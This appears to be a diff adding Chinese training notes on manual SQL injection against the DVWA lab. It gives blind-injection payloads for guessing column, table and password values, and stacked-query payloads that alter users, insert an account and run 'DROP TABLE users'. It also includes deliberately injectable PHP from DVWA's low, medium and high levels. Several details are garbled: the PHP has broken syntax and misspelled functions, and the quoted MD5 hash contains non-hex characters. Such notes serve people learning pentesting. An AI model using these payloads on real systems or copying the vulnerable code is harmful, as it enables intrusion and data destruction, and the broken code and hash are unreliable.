@@ -1,0 +1,191 @@
+课时90 手动漏洞挖掘-SQL注入
+
+手动漏洞挖掘-----SQL注入
+无权读取information_schema库 / 拒绝union、orderby语句
+    猜列明: 'and column is null--+
+         Burp suite自动猜列名
+    猜当前表表名: 'and table user is null--+
+    猜库里其他表: 'and (select count(*) from table)>0--+
+    列表对应关系: 'and user.user is null--+
+    猜字段内容: 'or user='admin
+                'or user like '%a%
+    猜账号对应密码: 
+        'or user='admin' and password='5f4dcc3b5aa765d61d8327dev832cf99
+
+root@R:~# find / -name *column*.txt
+find: '/media/sf_D_DRIVE/$RECYCLE.BIN/S-1-5-21-2268366954-3546357879-2348310953-1001': 不允许的操作
+find: '/media/sf_D_DRIVE/System Volume Information': 不允许的操作
+/media/sf_D_DRIVE/软件/Pangolin/columns.txt
+/media/sf_D_DRIVE/软件/Pangolin/pangolin3.3+4.0+注册机/pangolin3.3/columns.txt
+/media/sf_D_DRIVE/软件/Pangolin/pangolin3.3+4.0+注册机/pangolin_professinal_edit
+ion_4.0.0.1293/professinal_edition/columns.txt
+/usr/share/golismero/tools/sqlmap/txt/common-columns.txt
+/usr/share/w3af/w3af/plugins/attack/db/sqlmap/txt/common-columns.txt
+/usr/share/sqlmap/txt/common-columns.txt
+
+root@R:~# cat /usr/share/golismero/tools/sqlmap/txt/common-columns.txt
+
+root@R:~# cat /usr/share/golismero/tools/sqlmap/txt/common-columns.txt | grep -v ^# > column.txt
+
+root@R:~# cat column.txt
+
+root@R:~# find / -name *table*.txt
+
+root@R:~# cp /media/sf_D_DRIVE/软件/Pangolin/pangolin3.3+4.0+注册机/pangolin_professinal_edition_edition_4.0.0.1293/professinal_edition/tables.txt .
+
+root@R:~# ls
+column.txt  Desktop  Document  Downloads  Music  Pictures  Public  table.txt  Templates  Videos
+
+root@R:~#  cat table.txt
+
+root@R:~# cp /usr/share/golismero/tools/sqlmap/txt/common-table.txt
+
+root@R:~# cat common-table.txt
+
+root@R:~# cat common-table.txt | grep -v ^# table.txt
+
+手动漏洞挖掘-----SQL注入
+当数据库可写
+    ;update users set user='yuanfh' where user='admin
+        注入失败，Sql客户端工具的问题
+        http://dev/mysql.com/doc/refman/5.7/en/commands-out-of-sync.html
+    ;INSERT INTO users ('user_id','first_name','last_name','user','password','avatar')VALUES
+    ('35','fh','yuan','yfh','5f4dcc3b5aa765d61d8327dev832cf99','OK');--+
+    ;DROP TABLE users;--
+    xp_cmdshell/存储过程
+SQLi没有通用的方法，掌握原理，了解各种数据库特性
+
+root@R:~# echo password > 1
+
+root@R:~# md5sum 1
+286755fad04869ca523320acce0dc6a4
+
+msfadmin@metasploitable:~$ msysql -u root -p
+
+mysql> use dvwa;
+
+mysql> select * from users;select * from guestbook;
+
+手动漏洞挖掘-----SQL注入
+Medium难度级别
+    mysql_real_escape_string()
+        PHP 4 >= 4.3.0,PHP 5
+    PHP 5.5.0已经弃用此函数
+    PHP 7.0.0已经删除此函数，代之以MySQLi、PDO_MySQL
+    转义符，对下列字符转义
+        \x00
+        \n
+        \r
+        '
+        "
+        \x1a
+
+----------------------------------------------------------------------------------
+低安全代码
+<?php
+
+if(isset($_GET['Submit'])){
+
+    // Retrieve data
+
+    $id = $_GET('id');
+
+    $getid = "SELECT first_name,last_name FROM users WHERE user_id = '$id'";
+    $result = mysql_query($getid) or die('<pre>' . mysql_error() . '<pre>');
+
+    $num = mysql_numrows($result);
+
+    $i = 0;
+
+    while ($i < $num){
+
+        $frist = mysql_result($result.$i."frist_name");
+        $last = mysql_result($result.$i."last_name");
+
+        echo '<pre>';
+        echo 'ID:' . $id . '<br>first_name:' . $frist . '<br>Surname:' .$,last;
+        echo '</pre>';
+
+        $i++;
+    }
+}
+?>
+----------------------------------------------------------------------------------
+中安全代码
+<?php
+
+if(isset($_GET['Submit'])){
+
+    // Retrieve data
+
+    $id = $_GET('id');
+    $id = mysql_real_escap_sting($id);
+
+    $getid = "SELECT first_name,last_name FROM users WHERE user_id = '$id'";
+
+    $result = mysql_query($getid) or die('<pre>' . mysql_error() . '<pre>');
+
+    $num = mysql_numrows($result);
+
+    $i = 0;
+
+    while ($i < $num){
+
+        $frist = mysql_result($result.$i."frist_name");
+        $last = mysql_result($result.$i."last_name");
+
+        echo '<pre>';
+        echo 'ID:' . $id . '<br>first_name:' . $frist . '<br>Surname:' .$,last;
+        echo '</pre>';
+
+        $i++;
+    }
+}
+?>
+----------------------------------------------------------------------------------
+
+手动漏洞挖掘-----SQL注入
+high难度级别
+    mysql_real_escape_string()
+    stripslashes()
+        去除"\"
+    is_numeric()
+        判断是否是数字
+
+----------------------------------------------------------------------------------
+中安全代码
+<?php
+
+if(isset($_GET['Submit'])){
+
+    // Retrieve data
+
+    $id = $_GET('id');
+    $id = stripsashed($id);
+    $id = mysql_real_escap_sting($id);
+
+    if (is_numeric($id)){
+
+        $getid = "SELECT first_name,last_name FROM users WHERE user_id = '$id'";
+
+        $result = mysql_query($getid) or die('<pre>' . mysql_error() . '<pre>');
+
+        $num = mysql_numrows($result);
+
+        $i = 0;
+
+        while ($i < $num){
+
+            $frist = mysql_result($result.$i."frist_name");
+            $last = mysql_result($result.$i."last_name");
+
+            echo '<pre>';
+            echo 'ID:' . $id . '<br>first_name:' . $frist . '<br>Surname:' .$,last;
+            echo '</pre>';
+
+            $i++;
+        }
+    }
+}
+?>
+----------------------------------------------------------------------------------
